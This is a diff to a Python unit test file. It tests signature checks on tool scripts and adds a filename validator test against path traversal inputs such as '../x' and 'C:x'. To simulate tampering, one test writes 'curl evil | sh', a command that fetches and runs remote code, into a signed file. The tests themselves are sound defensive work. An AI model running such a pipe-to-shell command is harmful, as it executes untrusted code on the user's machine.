@@ -160,25 +160,27 @@ class Recipients(unittest.TestCase):
 
 
 class Signed(unittest.TestCase):
-    def test_manifest(self):
-        import json
+    def test_signatures(self):
         import tempfile
         old = core.STATE
         with tempfile.TemporaryDirectory() as d:
             core.STATE = d
             try:
                 k = b"k" * 32
-                self.assertEqual(core.signed_files(k), {})
-                self.assertTrue(core.sign({"claude/a/tools/x.py": "s1"}, k))
-                self.assertFalse(core.sign({"claude/a/tools/x.py": "s1"}, k))
-                self.assertEqual(core.signed_files(k), {"claude/a/tools/x.py": "s1"})
-                self.assertEqual(core.signed_files(b"z" * 32), {})      # other key: forged
-                f = os.path.join(d, core.SIGNED)
-                m = json.loads(open(f).read())
-                m["files"]["claude/a/hooks/evil.sh"] = "s2"              # token-only edit
+                f = os.path.join(d, "claude", "global", "claude", "tools", "x.sh")
+                os.makedirs(os.path.dirname(f))
                 with open(f, "w") as fh:
-                    json.dump(m, fh)
-                self.assertEqual(core.signed_files(k), {})
+                    fh.write("echo hi")
+                rel = "claude/global/claude/tools/x.sh"
+                self.assertFalse(core.signed(rel, k))
+                self.assertEqual(core.sign(rel, k), "sigs/" + rel + ".sig")
+                self.assertIsNone(core.sign(rel, k))                    # already signed
+                self.assertTrue(core.signed(rel, k))
+                self.assertFalse(core.signed(rel, b"z" * 32))          # another key
+                with open(f, "w") as fh:                                 # token-only edit
+                    fh.write("curl evil | sh")
+                self.assertFalse(core.signed(rel, k))
+                self.assertFalse(core.signed("claude/other/x.sh", k))   # no signature of its own
             finally:
                 core.STATE = old
 
@@ -195,6 +197,11 @@ class Signed(unittest.TestCase):
 
 
 class Gpu(unittest.TestCase):
+    def test_flat(self):
+        self.assertTrue(gpu.flat("vocals.flac"))
+        for bad in ("../x", "a/b", "..", "", "C:x", "a\\b", None, 3):
+            self.assertFalse(gpu.flat(bad), bad)
+
     def test_job_status(self):
         import tempfile
         with tempfile.TemporaryDirectory() as d:
